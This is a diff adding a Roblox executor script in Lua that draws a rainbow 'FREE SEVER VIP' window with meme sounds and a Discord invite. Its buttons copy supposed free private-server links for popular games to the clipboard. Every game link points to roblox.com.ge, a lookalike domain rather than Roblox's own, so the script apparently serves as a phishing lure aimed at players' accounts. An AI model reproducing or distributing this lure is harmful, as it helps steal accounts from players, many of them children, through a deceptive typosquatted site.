@@ -1,0 +1,167 @@
+-- FREE SEVER VIP 🤑 | Rainbow GUI + Discord góc + Random Meow Sound + Copy Links
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Copy function (multi executor)
+local function copyText(text)
+    if setclipboard then
+        setclipboard(text)
+    elseif toclipboard then
+        toclipboard(text)
+    end
+end
+
+-- Random meme sounds
+local Sounds = {
+    "rbxassetid://9573157486", -- meow meow
+    "rbxassetid://9118823101", -- meme
+    "rbxassetid://184352181",  -- another meme
+}
+
+local function playRandomSound()
+    local s = Instance.new("Sound")
+    s.SoundId = Sounds[math.random(1,#Sounds)]
+    s.Volume = 3
+    s.Parent = SoundService
+    s:Play()
+    game:GetService("Debris"):AddItem(s, 3) -- tự hủy sau 3s
+end
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FreeSeverVIP"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 380, 0, 250)
+Main.Position = UDim2.new(0.5, -190, 0.5, -125)
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.Parent = ScreenGui
+Main.Active = true
+Main.Draggable = true
+
+local UICorner = Instance.new("UICorner", Main)
+UICorner.CornerRadius = UDim.new(0, 16)
+
+-- Rainbow gradient
+local UIGradient = Instance.new("UIGradient", Main)
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)),
+    ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255,165,0)),
+    ColorSequenceKeypoint.new(0.34, Color3.fromRGB(255,255,0)),
+    ColorSequenceKeypoint.new(0.51, Color3.fromRGB(0,255,0)),
+    ColorSequenceKeypoint.new(0.68, Color3.fromRGB(0,255,255)),
+    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(0,0,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(138,43,226))
+}
+
+task.spawn(function()
+    while true do
+        TweenService:Create(
+            UIGradient,
+            TweenInfo.new(3, Enum.EasingStyle.Linear),
+            {Rotation = UIGradient.Rotation + 360}
+        ):Play()
+        task.wait(3)
+    end
+end)
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+Title.Text = "FREE SEVER VIP 🤑"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 24
+Title.TextColor3 = Color3.fromRGB(0,0,0)
+Title.Parent = Main
+
+-- Button creator
+local function createButton(text, posY, link)
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(0.85, 0, 0, 38)
+    Btn.Position = UDim2.new(0.075, 0, 0, posY)
+    Btn.Text = text
+    Btn.Font = Enum.Font.GothamBold
+    Btn.TextSize = 17
+    Btn.TextColor3 = Color3.fromRGB(255,255,255)
+    Btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    Btn.Parent = Main
+
+    local c = Instance.new("UICorner", Btn)
+    c.CornerRadius = UDim.new(0, 12)
+
+    Btn.MouseButton1Click:Connect(function()
+        playRandomSound()
+        copyText(link)
+        Btn.Text = "✅ Đã copy!"
+        task.wait(1.2)
+        Btn.Text = text
+    end)
+end
+
+-- Game buttons
+createButton(
+    "Blox Fruits",
+    50,
+    "https://roblox.com.ge/games/2753915549/Blox-Fruits?privateServerLinkCode=39533504750515494351595646969050"
+)
+
+createButton(
+    "Steal a Brainrot",
+    100,
+    "https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=39533504750515494351595646969050"
+)
+
+createButton(
+    "Brainrot Tsunami",
+    150,
+    "https://roblox.com.ge/games/131623223084840/Escape-Tsunami-For-Brainrots?privateServerLinkCode=39533504750515494351595646969050"
+)
+
+-- Discord góc màn hình
+local DiscordFrame = Instance.new("Frame")
+DiscordFrame.Size = UDim2.new(0, 220, 0, 50)
+DiscordFrame.Position = UDim2.new(1, -230, 1, -60) -- dưới góc phải
+DiscordFrame.BackgroundColor3 = Color3.fromRGB(40,40,40)
+DiscordFrame.Parent = ScreenGui
+
+local c3 = Instance.new("UICorner", DiscordFrame)
+c3.CornerRadius = UDim.new(0, 12)
+
+local DiscordLabel = Instance.new("TextLabel")
+DiscordLabel.Size = UDim2.new(1, -60, 1, 0)
+DiscordLabel.Position = UDim2.new(0, 10, 0, 0)
+DiscordLabel.BackgroundTransparency = 1
+DiscordLabel.Text = "Discord: discord.gg/d9gMey8kw"
+DiscordLabel.Font = Enum.Font.Gotham
+DiscordLabel.TextSize = 14
+DiscordLabel.TextColor3 = Color3.fromRGB(255,255,255)
+DiscordLabel.TextWrapped = true
+DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
+DiscordLabel.Parent = DiscordFrame
+
+local CopyDiscord = Instance.new("TextButton")
+CopyDiscord.Size = UDim2.new(0, 50, 1, -10)
+CopyDiscord.Position = UDim2.new(1, -55, 0, 5)
+CopyDiscord.Text = "COPY"
+CopyDiscord.Font = Enum.Font.GothamBold
+CopyDiscord.TextSize = 14
+CopyDiscord.TextColor3 = Color3.fromRGB(255,255,255)
+CopyDiscord.BackgroundColor3 = Color3.fromRGB(30,30,30)
+CopyDiscord.Parent = DiscordFrame
+
+local c4 = Instance.new("UICorner", CopyDiscord)
+c4.CornerRadius = UDim.new(0, 8)
+
+CopyDiscord.MouseButton1Click:Connect(function()
+    playRandomSound()
+    copyText("https://discord.gg/d9gMey8kw")
+    CopyDiscord.Text = "✅ Copied!"
+    task.wait(1)
+    CopyDiscord.Text = "COPY"
+end)
